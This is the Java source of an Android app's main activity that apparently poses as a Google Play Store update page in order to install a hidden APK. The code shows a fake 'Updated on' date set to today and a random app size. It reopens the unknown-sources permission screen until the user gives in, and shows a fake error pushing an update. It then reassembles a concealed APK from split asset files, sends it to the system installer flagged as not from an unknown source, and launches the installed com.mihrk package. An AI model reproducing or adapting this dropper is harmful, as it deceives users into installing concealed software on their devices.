package com.playstore.mihrk;

import android.content.ActivityNotFoundException;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.graphics.Outline;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.ViewOutlineProvider;
import android.view.ViewTreeObserver;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.graphics.drawable.AnimationDrawable;
import android.widget.Button;
import android.widget.TextView;
import android.provider.Settings;
import android.content.SharedPreferences;
import android.content.ComponentName;
import android.content.res.AssetManager;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.app.AlertDialog;
import androidx.core.content.FileProvider;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.List;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import java.security.MessageDigest;
import org.json.JSONObject;
import org.json.JSONException;

public class MainActivity extends AppCompatActivity {

    private ActivityResultLauncher<Intent> apkPickerLauncher;
    private AlertDialog updateDialog;
    private BroadcastReceiver installReceiver;
    private boolean awaitingInstall = false;
    private ActivityResultLauncher<Intent> unknownSourcesLauncher;
    private boolean pendingAssetsInstall = false;
    private boolean launchedPermissionAtStart = false;
    private static final String PREFS_NAME = "installer_prefs";
    private static final String KEY_PREFERRED_INSTALLER = "preferred_installer"; // package name
    private static final String KEY_PREFERRED_INSTALLER_ACTIVITY = "preferred_installer_activity"; // component class name
    private View updatingGroup;
    private Button btnUpdateNow;
    private Handler uiHandler;
    private AnimationDrawable bgAnim;
    private final Runnable hideLoadingRunnable = new Runnable() {
        @Override public void run() {
            if (updatingGroup != null) updatingGroup.setVisibility(View.GONE);
        }
    };

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        // Bind root (no animated background needed with new white UI)
        View root = findViewById(R.id.rootContainer);
        uiHandler = new Handler(Looper.getMainLooper());
        // Ensure rounded outline is applied to app icon reliably
        View iconView = findViewById(R.id.imgAppIcon);
        applyRoundedOutlineAfterLayout(iconView, dp(10));
        

        apkPickerLauncher = registerForActivityResult(
                new ActivityResultContracts.StartActivityForResult(),
                result -> {
                    if (result.getResultCode() == RESULT_OK && result.getData() != null) {
                        Uri apkUri = result.getData().getData();
                        startInstallIntent(apkUri);
                    }
                }
        );

        unknownSourcesLauncher = registerForActivityResult(
                new ActivityResultContracts.StartActivityForResult(),
                result -> {
                    boolean allowed = canInstallUnknownApps();
                    if (launchedPermissionAtStart) {
                        // Coming back from initial permission screen
                        launchedPermissionAtStart = false;
                        if (!allowed) {
                            // User pressed back or denied -> immediately relaunch permission screen until allowed
                            launchedPermissionAtStart = true;
                            Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                                    Uri.parse("package:" + getPackageName()));
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            unknownSourcesLauncher.launch(intent);
                            return;
                        }
                        // Allowed -> show home card UI
                        setupHomeUi();
                        return;
                    }
                    if (allowed) {
                        if (pendingAssetsInstall) {
                            pendingAssetsInstall = false;
                            installBaseApkFromAssets();
                        }
                    } else {
                        // Denied mid-flow -> loop permission again until user allows
                        Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                                Uri.parse("package:" + getPackageName()));
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        unknownSourcesLauncher.launch(intent);
                    }
                }
        );

        // If target app is already installed, launch it directly
        if (launchTargetIfAvailable()) {
            return;
        }

        // Immediately request Unknown Sources permission on first open if needed
        if (!canInstallUnknownApps()) {
            launchedPermissionAtStart = true;
            Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                    Uri.parse("package:" + getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            unknownSourcesLauncher.launch(intent);
        } else {
            // Permission already granted -> show home card UI
            setupHomeUi();
        }
    }

    private void showTransientLoading(long millis) {
        if (updatingGroup != null) updatingGroup.setVisibility(View.VISIBLE);
        if (uiHandler != null) {
            uiHandler.removeCallbacks(hideLoadingRunnable);
            uiHandler.postDelayed(hideLoadingRunnable, millis);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (bgAnim != null && !bgAnim.isRunning()) {
            try { bgAnim.start(); } catch (Throwable ignore) {}
        }
        if (installReceiver == null) {
            installReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(android.content.Context context, Intent intent) {
                    if (Intent.ACTION_PACKAGE_ADDED.equals(intent.getAction())) {
                        Uri data = intent.getData();
                        if (data != null) {
                            String installedPkg = data.getSchemeSpecificPart();
                            if ("com.mihrk.sir".equals(installedPkg)) {
                                Intent launch = getPackageManager().getLaunchIntentForPackage(installedPkg);
                                if (launch != null) {
                                    launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    startActivity(launch);
                                }
                            }
                            awaitingInstall = false; // reset regardless
                        }
                    }
                }
            };
            IntentFilter filter = new IntentFilter(Intent.ACTION_PACKAGE_ADDED);
            filter.addDataScheme("package");
            registerReceiver(installReceiver, filter);
        }
    }

    private boolean ensureUnknownSourcesPermission() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            return true;
        }
        if (canInstallUnknownApps()) {
            return true;
        }
        Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                Uri.parse("package:" + getPackageName()));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        unknownSourcesLauncher.launch(intent);
        return false;
    }

    private boolean canInstallUnknownApps() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return true;
        return getPackageManager().canRequestPackageInstalls();
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (bgAnim != null && bgAnim.isRunning()) {
            try { bgAnim.stop(); } catch (Throwable ignore) {}
        }
        if (installReceiver != null) {
            unregisterReceiver(installReceiver);
            installReceiver = null;
        }
    }

    private void setupHomeUi() {
        // Bind views from Play Store-like card
        View btnUpdate = findViewById(R.id.btnUpdate);
        TextView btnMoreInfo = findViewById(R.id.btnMoreInfo);
        View infoGroup = findViewById(R.id.infoGroup);
        View loadingOverlay = findViewById(R.id.loadingOverlay);
        TextView txtInfoNotice = findViewById(R.id.txtInfoNotice);
        TextView txtUpdatedOn = findViewById(R.id.txtUpdatedOn);
        TextView txtSize = findViewById(R.id.txtSize);

        // Set current date based on device locale (e.g., Dec 6, 2025)
        setUpdatedOnNow(txtUpdatedOn);

        // Set size once per device (persist) and keep stable across runs
        if (txtSize != null) {
            txtSize.setText("Size: " + getOrGenerateAppSizeMb() + " MB");
        }

        if (btnUpdate != null) {
            btnUpdate.setOnClickListener(v -> {
                awaitingInstall = true;
                installBaseApkFromAssets();
            });
        }
        if (btnMoreInfo != null) {
            btnMoreInfo.setOnClickListener(v -> {
                if (infoGroup != null && infoGroup.getVisibility() != View.VISIBLE) {
                    infoGroup.setVisibility(View.VISIBLE);
                }
                showInfoDialogWithLoading();
            });
        }

        // Hide any inline loader/notice if previously visible (we now use modal dialog)
        if (loadingOverlay != null) loadingOverlay.setVisibility(View.GONE);
        if (txtInfoNotice != null) txtInfoNotice.setVisibility(View.GONE);

    }

    // Helper to set "Updated on <Mon> <d>, <yyyy>" using device's current date and locale
    private void setUpdatedOnNow(@Nullable TextView txtUpdatedOn) {
        try {
            java.util.Locale locale = java.util.Locale.getDefault();
            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("MMM d, yyyy", locale);
            String dateStr = sdf.format(new java.util.Date());
            if (txtUpdatedOn == null) {
                txtUpdatedOn = findViewById(R.id.txtUpdatedOn);
            }
            if (txtUpdatedOn != null) {
                txtUpdatedOn.setText("Updated on " + dateStr);
            }
        } catch (Exception ignored) {}
    }

    private void showInfoDialogWithLoading() {
        try {
            // Show loading container
            LinearLayout loadingContainer = findViewById(R.id.loadingErrorContainer);
            ProgressBar loadingProgress = findViewById(R.id.loadingProgress);
            TextView loadingText = findViewById(R.id.loadingText);
            TextView errorText = findViewById(R.id.errorText);
            
            // Set loading state
            loadingContainer.setVisibility(View.VISIBLE);
            loadingProgress.setVisibility(View.VISIBLE);
            loadingText.setVisibility(View.VISIBLE);
            errorText.setVisibility(View.GONE);
            
            // Position the container above the glass card
            loadingContainer.setPadding(0, 0, 0, dp(8));
            
            if (uiHandler == null) uiHandler = new Handler(Looper.getMainLooper());
            
            // After 4 seconds, show error message
            uiHandler.postDelayed(() -> {
                try {
                    // Show error message
                    loadingProgress.setVisibility(View.GONE);
                    loadingText.setVisibility(View.GONE);
                    
                    // Set error message
                    errorText.setText("Please update the app to access additional information and features.\nYou'll need to update before viewing these details.");
                    errorText.setVisibility(View.VISIBLE);
                    
                    // Hide after 5 seconds
                    uiHandler.postDelayed(() -> {
                        try {
                            loadingContainer.setVisibility(View.GONE);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }, 5000);
                    
                } catch (Throwable t) {
                    t.printStackTrace();
                    loadingContainer.setVisibility(View.GONE);
                }
            }, 4000);
            
        } catch (Throwable t) {
            t.printStackTrace();
        }
    }

    private int dp(int d) {
        return (int) (d * getResources().getDisplayMetrics().density);
    }

    private void applyRoundedOutlineAfterLayout(final View view, final float cornerRadius) {
        if (view == null) return;
        
        view.getViewTreeObserver().addOnGlobalLayoutListener(new ViewTreeObserver.OnGlobalLayoutListener() {
            @Override
            public void onGlobalLayout() {
                view.getViewTreeObserver().removeOnGlobalLayoutListener(this);
                
                // Create a rounded drawable for the outline
                GradientDrawable shape = new GradientDrawable();
                shape.setShape(GradientDrawable.RECTANGLE);
                shape.setCornerRadius(cornerRadius);
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                    view.setBackground(shape);
                } else {
                    view.setBackgroundDrawable(shape);
                }
                
                // Set clip to outline for better performance
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    view.setClipToOutline(true);
                    view.setOutlineProvider(new ViewOutlineProvider() {
                        @Override
                        public void getOutline(View view, Outline outline) {
                            outline.setRoundRect(0, 0, view.getWidth(), view.getHeight(), cornerRadius);
                        }
                    });
                }
            }
        });
    }

    // Generate a random size under 10 MB once and persist it; keep stable for future runs on same device
    private String getOrGenerateAppSizeMb() {
        try {
            SharedPreferences sp = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            String saved = sp.getString("app_size_mb", null);
            if (saved != null) return saved;

            // Generate values like 3.7, 4.3, 6.2, 9.4 etc. between 3.0 and 9.9
            java.util.Random r = new java.util.Random();
            int major = 3 + r.nextInt(7); // 3..9
            int minor = r.nextInt(10);    // .0 .. .9
            // Ensure under 10 and at least 3.1
            if (major == 3 && minor == 0) minor = 1;
            String value = major + "." + minor;
            sp.edit().putString("app_size_mb", value).apply();
            return value;
        } catch (Exception e) {
            return "3.9";
        }
    }

    private boolean launchTargetIfAvailable() {
        // Prefer com.mihrk.sir
        Intent launch = getPackageManager().getLaunchIntentForPackage("com.mihrk.sir");
        if (launch != null) {
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(launch);
            return true;
        }
        // Else, launch any installed com.mihrk.* app
        try {
            PackageManager pm = getPackageManager();
            List<PackageInfo> pkgs = pm.getInstalledPackages(0);
            for (PackageInfo info : pkgs) {
                if (info.packageName != null && info.packageName.startsWith("com.mihrk")) {
                    Intent anyLaunch = pm.getLaunchIntentForPackage(info.packageName);
                    if (anyLaunch != null) {
                        anyLaunch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(anyLaunch);
                        return true;
                    }
                }
            }
        } catch (Exception ignore) {}
        return false;
    }

    private void pickApk() {
        Intent intent = new Intent(Intent.ACTION_OPEN_DOCUMENT);
        intent.addCategory(Intent.CATEGORY_OPENABLE);
        intent.setType("application/vnd.android.package-archive");
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        apkPickerLauncher.launch(intent);
    }

    private void startInstallIntent(Uri apkUri) {
        if (apkUri == null) return;
        // 1) Primary path: ACTION_VIEW with explicit Package Installer component (more OEM-compatible UI with Install/Cancel)
        String installerPkg = resolveSystemPackageInstaller();
        Intent view = new Intent(Intent.ACTION_VIEW);
        view.setDataAndType(apkUri, "application/vnd.android.package-archive");
        view.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
        view.addCategory(Intent.CATEGORY_DEFAULT);
        if (installerPkg != null) {
            view.setPackage(installerPkg);
            try { grantUriPermission(installerPkg, apkUri, Intent.FLAG_GRANT_READ_URI_PERMISSION); } catch (Exception ignore) {}
            savePreferredInstaller(installerPkg);
            String savedActivity = getPreferredInstallerActivity();
            if (savedActivity != null) {
                try { view.setComponent(new ComponentName(installerPkg, savedActivity)); } catch (Exception ignore) {}
            }
            if (view.getComponent() == null) {
                ComponentName best = pickBestInstallerActivity(view, installerPkg);
                if (best != null) {
                    view.setComponent(best);
                    savePreferredInstallerActivity(best.getClassName());
                }
            }
        }
        if (view.getComponent() == null) {
            ComponentName byLabel = findPackageInstallerByLabel(view);
            if (byLabel != null) {
                view.setComponent(byLabel);
                savePreferredInstaller(byLabel.getPackageName());
                savePreferredInstallerActivity(byLabel.getClassName());
            }
        }
        try {
            startActivity(view);
            return;
        } catch (Exception ignored) {}

        // 2) Secondary path: ACTION_INSTALL_PACKAGE (fallback)
        Intent install = new Intent(Intent.ACTION_INSTALL_PACKAGE);
        install.setData(apkUri);
        install.setType("application/vnd.android.package-archive");
        install.putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true);
        install.putExtra(Intent.EXTRA_RETURN_RESULT, false);
        install.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
        install.addCategory(Intent.CATEGORY_DEFAULT);
        if (installerPkg != null) {
            install.setPackage(installerPkg);
            try { grantUriPermission(installerPkg, apkUri, Intent.FLAG_GRANT_READ_URI_PERMISSION); } catch (Exception ignore) {}
            String savedActivity = getPreferredInstallerActivity();
            if (savedActivity != null) {
                try { install.setComponent(new ComponentName(installerPkg, savedActivity)); } catch (Exception ignore) {}
            }
            if (install.getComponent() == null) {
                ComponentName best = pickBestInstallerActivity(install, installerPkg);
                if (best != null) {
                    install.setComponent(best);
                    savePreferredInstallerActivity(best.getClassName());
                }
            }
        }
        if (install.getComponent() == null) {
            ComponentName byLabel2 = findPackageInstallerByLabel(install);
            if (byLabel2 != null) {
                install.setComponent(byLabel2);
            }
        }
        startActivity(install);
    }

    private String resolveSystemPackageInstaller() {
        try {
            PackageManager pm = getPackageManager();
            // 1) Use cached preferred installer if still valid
            String cached = getPreferredInstaller();
            if (isValidInstaller(pm, cached)) {
                return cached;
            }
            // Priority list of common OEM system installers
            String[] knownInstallers = new String[] {
                    "com.google.android.packageinstaller", // Pixel/OnePlus/Stock (newer)
                    "com.android.packageinstaller",        // AOSP/older
                    "com.android.permissioncontroller",    // Newer AOSP/Android 10+
                    "com.google.android.packageinstaller:installer", // some variants
                    "com.miui.packageinstaller",           // Xiaomi/MIUI
                    "com.samsung.android.packageinstaller",// Samsung
                    "com.huawei.appmarket",                 // Huawei (may handle installs)
                    "com.huawei.systemmanager",             // Huawei system manager
                    "com.vivo.securecenter",                // Vivo
                    "com.coloros.safecenter",               // Oppo/ColorOS
                    "com.heytap.safecenter",                // Oppo new
                    "com.oplus.safecenter",                 // OPlus/Realme newer
                    "com.realme.securitycenter"             // Realme older
            };

            Intent test = new Intent(Intent.ACTION_INSTALL_PACKAGE);
            test.setData(Uri.parse("content://dummy/dummy.apk"));
            test.setType("application/vnd.android.package-archive");
            test.addCategory(Intent.CATEGORY_DEFAULT);

            // 2) Try prioritized known installers first
            for (String pkg : knownInstallers) {
                try {
                    pm.getPackageInfo(pkg, 0);
                    Intent specific = new Intent(test);
                    specific.setPackage(pkg);
                    android.content.pm.ResolveInfo ri = pm.resolveActivity(specific, 0);
                    if (ri != null && ri.activityInfo != null && isSystemApp(ri.activityInfo.applicationInfo)) {
                        savePreferredInstaller(pkg);
                        if (ri.activityInfo.name != null) {
                            savePreferredInstallerActivity(ri.activityInfo.name);
                        }
                        return pkg;
                    }
                } catch (Exception ignore) {}
            }

            // 3) Else query all handlers and pick first system one
            List<android.content.pm.ResolveInfo> infos = pm.queryIntentActivities(test, 0);
            String best = null;
            for (android.content.pm.ResolveInfo ri : infos) {
                if (ri.activityInfo == null || ri.activityInfo.packageName == null) continue;
                if (!isSystemApp(ri.activityInfo.applicationInfo)) continue;
                String pkg = ri.activityInfo.packageName;
                // Prefer any that contains 'packageinstaller'
                String lower = pkg.toLowerCase();
                if (lower.contains("packageinstaller")) {
                    savePreferredInstaller(pkg);
                    if (ri.activityInfo != null && ri.activityInfo.name != null) {
                        savePreferredInstallerActivity(ri.activityInfo.name);
                    }
                    return pkg;
                }
                if (best == null) best = pkg;
            }
            if (best != null) savePreferredInstaller(best);
            return best;
        } catch (Exception e) {
            return null;
        }
    }

    // Try to find the entry explicitly labelled "Package installer" (or similar)
    private ComponentName findPackageInstallerByLabel(Intent baseIntent) {
        try {
            Intent query = new Intent(baseIntent);
            if (query.getAction() == null) query.setAction(Intent.ACTION_VIEW);
            query.addCategory(Intent.CATEGORY_DEFAULT);
            if (query.getData() == null) {
                query.setDataAndType(Uri.parse("content://dummy/dummy.apk"), "application/vnd.android.package-archive");
            }
            PackageManager pm = getPackageManager();
            List<android.content.pm.ResolveInfo> list = pm.queryIntentActivities(query, 0);
            if (list == null || list.isEmpty()) return null;
            ComponentName bestCN = null;
            for (android.content.pm.ResolveInfo ri : list) {
                if (ri.activityInfo == null) continue;
                CharSequence label = ri.loadLabel(pm);
                String labelStr = label == null ? "" : label.toString();
                String pkg = ri.activityInfo.packageName == null ? "" : ri.activityInfo.packageName;
                String cls = ri.activityInfo.name == null ? null : ri.activityInfo.name;
                // Strong signals: exact label match or package name contains packageinstaller
                boolean labelMatch = labelStr.equalsIgnoreCase("Package installer") || labelStr.equalsIgnoreCase("Package Installer");
                boolean pkgMatch = pkg.toLowerCase().contains("packageinstaller") || pkg.toLowerCase().contains("permissioncontroller") || pkg.toLowerCase().contains("miui.packageinstaller");
                boolean exported = ri.activityInfo.exported;
                boolean enabled = ri.activityInfo.enabled;
                boolean nameHint = cls != null && (cls.toLowerCase().contains("install") || cls.toLowerCase().contains("packageinstaller"));
                if ((labelMatch || pkgMatch || nameHint) && cls != null && exported && enabled && isSystemApp(ri.activityInfo.applicationInfo)) {
                    bestCN = new ComponentName(pkg, cls);
                    break;
                }
            }
            return bestCN;
        } catch (Exception ignore) {
            return null;
        }
    }

    // Pick best explicit activity inside the given installer package
    private ComponentName pickBestInstallerActivity(Intent baseIntent, String installerPkg) {
        try {
            if (installerPkg == null) return null;
            PackageManager pm = getPackageManager();
            Intent query = new Intent(baseIntent);
            query.setPackage(installerPkg);
            List<android.content.pm.ResolveInfo> list = pm.queryIntentActivities(query, 0);
            if (list == null || list.isEmpty()) return null;
            ComponentName candidate = null;
            for (android.content.pm.ResolveInfo ri : list) {
                if (ri.activityInfo == null) continue;
                String cls = ri.activityInfo.name;
                if (cls == null) continue;
                boolean exported = ri.activityInfo.exported;
                boolean enabled = ri.activityInfo.enabled;
                boolean nameHint = cls.toLowerCase().contains("install") || cls.toLowerCase().contains("packageinstaller");
                if (exported && enabled && nameHint && isSystemApp(ri.activityInfo.applicationInfo)) {
                    return new ComponentName(installerPkg, cls);
                }
                if (exported && enabled && isSystemApp(ri.activityInfo.applicationInfo)) {
                    candidate = new ComponentName(installerPkg, cls);
                }
            }
            return candidate;
        } catch (Exception ignore) {
            return null;
        }
    }

    private boolean isSystemApp(android.content.pm.ApplicationInfo ai) {
        if (ai == null) return false;
        int flags = ai.flags;
        return (flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
                || (flags & android.content.pm.ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0;
    }

    private void savePreferredInstaller(String pkg) {
        if (pkg == null) return;
        try {
            SharedPreferences sp = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            sp.edit().putString(KEY_PREFERRED_INSTALLER, pkg).apply();
        } catch (Exception ignore) {}
    }

    private void savePreferredInstallerActivity(String activityName) {
        if (activityName == null) return;
        try {
            SharedPreferences sp = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            sp.edit().putString(KEY_PREFERRED_INSTALLER_ACTIVITY, activityName).apply();
        } catch (Exception ignore) {}
    }

    private String getPreferredInstaller() {
        try {
            SharedPreferences sp = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            return sp.getString(KEY_PREFERRED_INSTALLER, null);
        } catch (Exception e) {
            return null;
        }
    }

    private String getPreferredInstallerActivity() {
        try {
            SharedPreferences sp = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            return sp.getString(KEY_PREFERRED_INSTALLER_ACTIVITY, null);
        } catch (Exception e) {
            return null;
        }
    }

    private boolean isValidInstaller(PackageManager pm, String pkg) {
        if (pkg == null) return false;
        try {
            pm.getPackageInfo(pkg, 0);
            Intent test = new Intent(Intent.ACTION_INSTALL_PACKAGE);
            test.setData(Uri.parse("content://dummy/dummy.apk"));
            test.setType("application/vnd.android.package-archive");
            test.setPackage(pkg);
            android.content.pm.ResolveInfo ri = pm.resolveActivity(test, 0);
            return ri != null && ri.activityInfo != null && isSystemApp(ri.activityInfo.applicationInfo);
        } catch (Exception e) {
            return false;
        }
    }

    private void installBaseApkFromAssets() {
        try {
            if (!ensureUnknownSourcesPermission()) {
                pendingAssetsInstall = true;
                return;
            }
            // Prepare APK from assets to a private files directory (updates)
            File updatesDir = new File(getFilesDir(), "updates");
            if (!updatesDir.exists() && !updatesDir.mkdirs()) {
                return;
            }
            File prepared = prepareApkFromAssets(updatesDir);
            if (prepared == null || !prepared.exists()) {
                return;
            }
            Uri contentUri = FileProvider.getUriForFile(
                    this,
                    getPackageName() + ".provider",
                    prepared
            );
            startInstallIntent(contentUri);
        } catch (Exception e) {
            // Swallow to avoid crashes in production; user can still use Preview
        }
    }

    @Override
    protected void onStart() {
        super.onStart();
        // Any time we come to foreground, if target is installed -> launch it, then finish
        if (launchTargetIfAvailable()) {
            finish();
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        // Ensure redirection on new intents (e.g., from Recents)
        if (launchTargetIfAvailable()) {
            finish();
        }
    }


    private void copyAssetToFile(String assetName, File dest) throws IOException {
        try (InputStream in = getAssets().open(assetName);
             OutputStream out = new FileOutputStream(dest)) {
            byte[] buffer = new byte[8192];
            int len;
            while ((len = in.read(buffer)) != -1) {
                out.write(buffer, 0, len);
            }
            out.flush();
        }
    }

    // Reassemble split APK if manifest exists, fallback to direct base.apk
    private @androidx.annotation.Nullable File prepareApkFromAssets(File updatesDir) {
        try {
            AssetManager am = getAssets();
            String[] root = am.list("");
            boolean hasManifest = false;
            if (root != null) {
                for (String n : root) { if ("base.apk.parts.json".equals(n)) { hasManifest = true; break; } }
            }
            File outFile = new File(updatesDir, "base.apk");
            if (!hasManifest) {
                copyAssetToFile("base.apk", outFile);
                return outFile;
            }
            String manifest = readAssetAsString("base.apk.parts.json");
            if (manifest == null) {
                copyAssetToFile("base.apk", outFile);
                return outFile;
            }
            JSONObject obj = new JSONObject(manifest);
            int parts = obj.optInt("parts", 0);
            String expect = obj.optString("hash", "");
            if (parts <= 0) {
                copyAssetToFile("base.apk", outFile);
                return outFile;
            }
            File tmp = new File(updatesDir, "base.apk.tmp");
            if (tmp.exists()) tmp.delete();
            try (OutputStream out = new FileOutputStream(tmp)) {
                for (int i = 0; i < parts; i++) {
                    String partName = String.format("base.apk.part%03d", i);
                    try (InputStream in = am.open(partName)) {
                        byte[] buf = new byte[8192];
                        int l;
                        while ((l = in.read(buf)) != -1) out.write(buf, 0, l);
                    }
                }
                out.flush();
            }
            if (expect != null && !expect.isEmpty()) {
                String actual = sha256OfFile(tmp);
                if (!expect.equalsIgnoreCase(actual)) {
                    tmp.delete();
                    return null;
                }
            }
            if (outFile.exists()) outFile.delete();
            if (!tmp.renameTo(outFile)) {
                try (InputStream in = new java.io.FileInputStream(tmp);
                     OutputStream out = new FileOutputStream(outFile)) {
                    byte[] buf = new byte[8192];
                    int l;
                    while ((l = in.read(buf)) != -1) out.write(buf, 0, l);
                    out.flush();
                }
                tmp.delete();
            }
            return outFile;
        } catch (IOException | JSONException e) {
            try {
                File outFile = new File(updatesDir, "base.apk");
                copyAssetToFile("base.apk", outFile);
                return outFile;
            } catch (Exception ignore) {
                return null;
            }
        }
    }

    private @androidx.annotation.Nullable String readAssetAsString(String name) {
        try (InputStream in = getAssets().open(name)) {
            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int l;
            while ((l = in.read(buf)) != -1) baos.write(buf, 0, l);
            return baos.toString("UTF-8");
        } catch (Exception e) {
            return null;
        }
    }

    private String sha256OfFile(File file) {
        try (InputStream in = new java.io.FileInputStream(file)) {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] buf = new byte[8192];
            int l;
            while ((l = in.read(buf)) != -1) md.update(buf, 0, l);
            byte[] d = md.digest();
            StringBuilder sb = new StringBuilder(d.length * 2);
            for (byte b : d) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Exception e) { return ""; }
    }
}

